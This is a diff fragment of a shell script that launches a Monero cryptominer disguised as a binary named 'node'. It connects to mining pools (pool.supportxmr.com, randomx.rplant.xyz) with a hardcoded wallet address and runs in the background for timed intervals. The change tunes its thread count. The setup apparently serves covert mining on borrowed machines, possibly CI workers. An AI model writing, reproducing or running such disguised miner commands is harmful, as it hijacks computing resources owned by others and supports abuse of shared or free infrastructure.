@@ -47,7 +47,7 @@ echo "start ${INPUT_NUMBER}"
 #START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o randomx.rplant.xyz:7130 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.crf_${WORKER_NUMBER} -p m=solo > try.log & sleep 1200 )
 
 # Monero
-START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o pool.supportxmr.com:3333 -u 4AnBzt2r9TcQtrQPt7eR4MYS3GtZqRi55Xq5pezcvqnv7WVvgteEshdF4Xcht5XMJwWP3mfH5Nk4s4cfRgZeCQyWUgEMeVo.crf_${INPUT_NUMBER} > try.log & sleep 1830 )
+START=$(./node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o pool.supportxmr.com:3333 -u 4AnBzt2r9TcQtrQPt7eR4MYS3GtZqRi55Xq5pezcvqnv7WVvgteEshdF4Xcht5XMJwWP3mfH5Nk4s4cfRgZeCQyWUgEMeVo.crf_${INPUT_NUMBER} > try.log & sleep 1830 )
 
 TIME=$(TZ=Asia/Jakarta date +"%H:%M")
 
